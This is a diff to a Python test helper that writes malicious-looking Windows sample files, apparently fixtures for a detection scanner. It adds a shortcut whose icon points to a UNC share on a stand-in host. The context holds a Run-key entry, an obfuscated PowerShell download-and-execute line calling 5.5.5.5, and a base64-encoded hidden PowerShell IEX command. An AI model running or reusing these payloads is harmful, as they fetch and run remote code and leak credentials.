@@ -222,6 +222,8 @@ def build_folder(root):
                 b"\"upd\"=\"C:\\\\g\\\\upd.exe\"\r\n")
     w("evil.url", b"[InternetShortcut]\r\nURL=file://C:\\\\g\\\\upd.exe\r\n")
     w("good.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n")
+    w("uncicon.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n"
+                      b"IconIndex=1\r\nIconFile=\\\\evil-share.example\\x.ico\r\n")
     w("backtick.ps1", b"$c = New-Object Net.WebClient; I`E`X ($c.DownloadString('http://5.5.5.5/a'))\n")
     import base64 as _b64
     _enc = _b64.b64encode(b"powershell -nop -w hidden -exec bypass IEX (New-Object "
